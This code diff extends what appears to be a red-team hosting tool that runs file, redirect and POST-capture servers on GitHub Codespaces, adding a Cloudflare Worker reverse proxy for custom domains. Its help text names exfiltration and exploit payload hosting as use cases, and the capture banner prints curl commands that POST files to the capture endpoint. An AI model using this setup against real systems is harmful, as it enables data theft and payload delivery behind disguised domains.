@@ -354,12 +354,16 @@ def _show_banner(title: str, cs_name: str, port: int, **info: str) -> None:
 
 def _launch_server(gh: GitHubManager, cs_name: str, port: int,
                    script: str, script_name: str,
-                   banner_fn) -> None:
+                   banner_fn, domain: str = None,
+                   config: 'Config' = None) -> None:
     """
     Upload a server script, start it, forward the port, show banner, and tail logs.
 
     This is the shared orchestrator for all serve_* functions. It handles:
     upload script -> start server -> verify -> port forward -> banner -> tail logs.
+
+    If a domain is specified, deploys a Cloudflare Worker as a reverse proxy
+    (auto-deploy with credentials, or generates the script for manual setup).
 
     Args:
         gh: GitHub manager
@@ -367,7 +371,9 @@ def _launch_server(gh: GitHubManager, cs_name: str, port: int,
         port: Port to serve on
         script: Formatted Python script content to upload
         script_name: Remote filename (e.g., 'server.py', 'redirect_server.py')
-        banner_fn: Callable(cs_name, port) that prints the server info banner
+        banner_fn: Callable(cs_name, port, domain=None) that prints the server info banner
+        domain: Optional custom domain for Cloudflare Worker proxy
+        config: Configuration (required if domain is set)
     """
     logger = get_logger()
 
@@ -382,12 +388,21 @@ def _launch_server(gh: GitHubManager, cs_name: str, port: int,
 
     fwd = _start_port_forwarding(gh, cs_name, port)
 
-    banner_fn(cs_name, port)
+    # Deploy Cloudflare Worker if domain is specified
+    cf_worker = None
+    if domain and config:
+        from .cloudflare import setup_worker
+        codespace_url = f"{cs_name}-{port}.app.github.dev"
+        cf_worker = setup_worker(codespace_url, domain, config)
+
+    banner_fn(cs_name, port, domain=domain)
 
     try:
         _tail_remote_logs(gh, cs_name)
     finally:
         fwd.terminate()
+        if cf_worker:
+            cf_worker.teardown()
 
 
 # =============================================================================
@@ -397,7 +412,8 @@ def _launch_server(gh: GitHubManager, cs_name: str, port: int,
 # =============================================================================
 
 
-def serve_file(file_path: Path, port: int, gh: GitHubManager, config: Config = None) -> None:
+def serve_file(file_path: Path, port: int, gh: GitHubManager,
+               config: Config = None, domain: str = None) -> None:
     """
     Upload a single file to a Codespace and serve it via HTTP.
 
@@ -417,12 +433,14 @@ def serve_file(file_path: Path, port: int, gh: GitHubManager, config: Config = N
     logger.info(f"Uploading {file_path.name}...")
     _upload_file(gh, cs_name, file_path, f"{SERVE_DIR}/{file_path.name}")
 
-    def banner(cs, p):
+    def banner(cs, p, domain=None):
         file_url = f"https://{cs}-{p}.app.github.dev/{file_path.name}"
         print(f"\n{'=' * 60}")
         print("File is now being served!")
         print(f"{'=' * 60}\n")
         print(f"File URL:\n  {file_url}\n")
+        if domain:
+            print(f"Custom domain:\n  https://{domain}/{file_path.name}\n")
         print(f"curl command:\n  curl -L \"{file_url}\"\n")
         print(f"wget command:\n  wget \"{file_url}\"\n")
         print(f"Local access:\n  curl http://localhost:{p}/{file_path.name}\n")
@@ -431,10 +449,11 @@ def serve_file(file_path: Path, port: int, gh: GitHubManager, config: Config = N
     _launch_server(gh, cs_name, port,
                    script=_FILE_SERVER_SCRIPT.format(PORT=port),
                    script_name="server.py",
-                   banner_fn=banner)
+                   banner_fn=banner, domain=domain, config=config)
 
 
-def serve_directory(dir_path: Path, port: int, gh: GitHubManager, config: Config = None) -> None:
+def serve_directory(dir_path: Path, port: int, gh: GitHubManager,
+                    config: Config = None, domain: str = None) -> None:
     """
     Upload a directory to a Codespace and serve it via HTTP.
 
@@ -459,12 +478,14 @@ def serve_directory(dir_path: Path, port: int, gh: GitHubManager, config: Config
     for f in files:
         _upload_file(gh, cs_name, f, f"{SERVE_DIR}/{f.name}")
 
-    def banner(cs, p):
+    def banner(cs, p, domain=None):
         base_url = f"https://{cs}-{p}.app.github.dev/"
         print(f"\n{'=' * 60}")
         print("Directory is now being served!")
         print(f"{'=' * 60}\n")
         print(f"Base URL:\n  {base_url}\n")
+        if domain:
+            print(f"Custom domain:\n  https://{domain}/\n")
         print("Files available:")
         for f in files:
             print(f"  {base_url}{f.name}")
@@ -473,11 +494,12 @@ def serve_directory(dir_path: Path, port: int, gh: GitHubManager, config: Config
     _launch_server(gh, cs_name, port,
                    script=_FILE_SERVER_SCRIPT.format(PORT=port),
                    script_name="server.py",
-                   banner_fn=banner)
+                   banner_fn=banner, domain=domain, config=config)
 
 
 def serve_redirect(target_url: str, port: int, redirect_code: int,
-                   gh: GitHubManager, config: Config = None) -> None:
+                   gh: GitHubManager, config: Config = None,
+                   domain: str = None) -> None:
     """
     Start an HTTP redirect server in a Codespace.
 
@@ -494,12 +516,14 @@ def serve_redirect(target_url: str, port: int, redirect_code: int,
 
     _setup_server_environment(gh, cs_name, port)
 
-    def banner(cs, p):
+    def banner(cs, p, domain=None):
         url = f"https://{cs}-{p}.app.github.dev/"
         print(f"\n{'=' * 60}")
         print("Redirect server is running!")
         print(f"{'=' * 60}\n")
         print(f"Redirect URL:\n  {url}\n")
+        if domain:
+            print(f"Custom domain:\n  https://{domain}/\n")
         print(f"Target:\n  {target_url}\n")
         print(f"Redirect Type:\n  HTTP {redirect_code}\n")
         print(f"Local access:\n  curl -v http://localhost:{p}/\n")
@@ -513,11 +537,12 @@ def serve_redirect(target_url: str, port: int, redirect_code: int,
                        REDIRECT_CODE=redirect_code,
                        PORT=port),
                    script_name="redirect_server.py",
-                   banner_fn=banner)
+                   banner_fn=banner, domain=domain, config=config)
 
 
 def serve_custom(port: int, response_body: str, content_type: str,
-                 status_code: int, gh: GitHubManager, config: Config = None) -> None:
+                 status_code: int, gh: GitHubManager, config: Config = None,
+                 domain: str = None) -> None:
     """
     Start a custom HTTP response server in a Codespace.
 
@@ -534,12 +559,14 @@ def serve_custom(port: int, response_body: str, content_type: str,
 
     _setup_server_environment(gh, cs_name, port)
 
-    def banner(cs, p):
+    def banner(cs, p, domain=None):
         url = f"https://{cs}-{p}.app.github.dev/"
         print(f"\n{'=' * 60}")
         print("Custom response server is running!")
         print(f"{'=' * 60}\n")
         print(f"URL:          {url}")
+        if domain:
+            print(f"Custom:       https://{domain}/")
         print(f"Local:        http://localhost:{p}/")
         print(f"Status:       {status_code}")
         print(f"Content-Type: {content_type}")
@@ -553,10 +580,11 @@ def serve_custom(port: int, response_body: str, content_type: str,
                        STATUS_CODE=status_code,
                        PORT=port),
                    script_name="custom_server.py",
-                   banner_fn=banner)
+                   banner_fn=banner, domain=domain, config=config)
 
 
-def serve_capture(port: int, gh: GitHubManager, config: Config = None) -> None:
+def serve_capture(port: int, gh: GitHubManager, config: Config = None,
+                  domain: str = None) -> None:
     """
     Start a capture server that logs and saves all incoming POST data.
 
@@ -568,6 +596,7 @@ def serve_capture(port: int, gh: GitHubManager, config: Config = None) -> None:
         port: Port to listen on
         gh: GitHub manager
         config: Configuration (for codespace selection)
+        domain: Optional custom domain via Cloudflare Worker
     """
     logger = get_logger()
 
@@ -579,18 +608,21 @@ def serve_capture(port: int, gh: GitHubManager, config: Config = None) -> None:
     _setup_server_environment(gh, cs_name, port)
     _ssh(gh, cs_name, "mkdir -p /tmp/serve/captures")
 
-    def banner(cs, p):
+    def banner(cs, p, domain=None):
         url = f"https://{cs}-{p}.app.github.dev/"
         sep = "=" * 60
         print(f"\n{sep}")
         print("Capture server is running!")
         print(f"{sep}\n")
         print(f"Capture URL:\n  {url}\n")
+        if domain:
+            print(f"Custom domain:\n  https://{domain}/\n")
         print(f"Local:        http://localhost:{p}/\n")
+        send_url = f"https://{domain}/" if domain else url
         print("Send data with:")
-        print(f"  curl -X POST -d 'data here' {url}")
-        print(f"  curl -X POST --data-binary @file.bin {url}")
-        print(f"  echo -n 'SGVsbG8=' | curl -X POST -d @- {url}\n")
+        print(f"  curl -X POST -d 'data here' {send_url}")
+        print(f"  curl -X POST --data-binary @file.bin {send_url}")
+        print(f"  echo -n 'SGVsbG8=' | curl -X POST -d @- {send_url}\n")
         print("Base64 payloads are auto-detected and decoded.")
         print("Captures saved to /tmp/serve/captures/ on Codespace.")
         print("On Ctrl+C, all captures will be downloaded locally.\n")
@@ -599,7 +631,7 @@ def serve_capture(port: int, gh: GitHubManager, config: Config = None) -> None:
     _launch_server(gh, cs_name, port,
                    script=_CAPTURE_SERVER_SCRIPT.format(PORT=port),
                    script_name="capture_server.py",
-                   banner_fn=banner)
+                   banner_fn=banner, domain=domain, config=config)
 
     _download_captures(gh, cs_name)
 
@@ -629,6 +661,10 @@ def stop_server(port: int, gh: GitHubManager, config: Config = None) -> None:
         )
     except FileNotFoundError:
         pass
+
+    # Tear down Cloudflare Worker if credentials are configured
+    from .cloudflare import teardown_worker
+    teardown_worker(port, config)
 
     logger.info("Server stopped")
 
@@ -662,6 +698,11 @@ def clean_all(gh: GitHubManager, config: Config = None) -> None:
         subprocess.run(['pkill', '-f', 'gh codespace ports forward'], capture_output=True)
     except FileNotFoundError:
         pass
+
+    # Tear down any Cloudflare Workers for common ports
+    from .cloudflare import teardown_worker
+    for port in [9999, 8080, 8888]:
+        teardown_worker(port, config)
 
     logger.info("Checking remaining forwarded ports...")
     result = gh.run_gh_command(
@@ -705,7 +746,8 @@ def cmd_file(args, config: Config, gh: GitHubManager) -> int:
         file_path=Path(args.filepath),
         port=args.port,
         gh=gh,
-        config=config
+        config=config,
+        domain=getattr(args, 'domain', None)
     )
     return 0
 
@@ -716,7 +758,8 @@ def cmd_dir(args, config: Config, gh: GitHubManager) -> int:
         dir_path=Path(args.directory),
         port=args.port,
         gh=gh,
-        config=config
+        config=config,
+        domain=getattr(args, 'domain', None)
     )
     return 0
 
@@ -728,7 +771,8 @@ def cmd_redirect(args, config: Config, gh: GitHubManager) -> int:
         port=args.port,
         redirect_code=args.code,
         gh=gh,
-        config=config
+        config=config,
+        domain=getattr(args, 'domain', None)
     )
     return 0
 
@@ -741,7 +785,8 @@ def cmd_custom(args, config: Config, gh: GitHubManager) -> int:
         content_type=args.content_type,
         status_code=args.status,
         gh=gh,
-        config=config
+        config=config,
+        domain=getattr(args, 'domain', None)
     )
     return 0
 
@@ -751,7 +796,8 @@ def cmd_capture(args, config: Config, gh: GitHubManager) -> int:
     serve_capture(
         port=args.port,
         gh=gh,
-        config=config
+        config=config,
+        domain=getattr(args, 'domain', None)
     )
     return 0
 
@@ -798,6 +844,7 @@ COMMANDS:
 
 OPTIONS:
     -c, --codespace    Codespace name to use (default: auto-select)
+    -d, --domain       Custom domain via Cloudflare Worker reverse proxy
     -v, --verbose      Enable verbose output
 
 EXAMPLES:
@@ -828,6 +875,10 @@ EXAMPLES:
     cs-serve capture
     cs-serve capture 8080
 
+    # Custom domain via Cloudflare Worker
+    cs-serve -d dev.example.com file payload.bin
+    cs-serve -d dev.example.com capture
+
     # Stop the server
     cs-serve stop
 
@@ -847,6 +898,12 @@ USE CASES:
     - Data capture: Log and save POST data with base64 auto-decode
     - Exfiltration: Capture data via request logging
     - Payload hosting: Serve exploit files
+
+CUSTOM DOMAIN:
+    Use -d/--domain to proxy through a Cloudflare Worker on your own domain.
+    Set CLOUDFLARE_API_TOKEN and CLOUDFLARE_ACCOUNT_ID env vars for auto-deploy.
+    Without credentials, a worker script is generated for manual deployment.
+    The worker is automatically torn down on Ctrl+C.
 
 NOTES:
     - Directory listing is disabled for file/dir serving
